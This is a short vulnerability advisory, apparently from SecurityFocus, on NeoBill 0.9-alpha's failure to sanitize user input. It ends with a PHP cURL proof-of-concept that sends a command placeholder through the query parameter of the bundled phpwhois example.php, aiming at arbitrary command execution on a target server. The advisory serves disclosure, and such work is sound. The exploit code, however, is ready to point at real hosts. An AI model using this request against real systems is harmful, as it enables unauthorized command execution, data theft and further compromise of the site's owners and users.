source: http://www.securityfocus.com/bid/64112/info

NeoBill is prone to multiple security vulnerabilities because it fails to sufficiently sanitize user-supplied data.

An attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database, to execute arbitrary commands, to execute local script code in the context of the application, the attacker may be able to obtain sensitive information that may aid in further attacks.

NeoBill 0.9-alpha is vulnerable; other versions may also be affected. 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://[target]/modules/nullregistrar/phpwhois/example.php?query=[CMD]");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;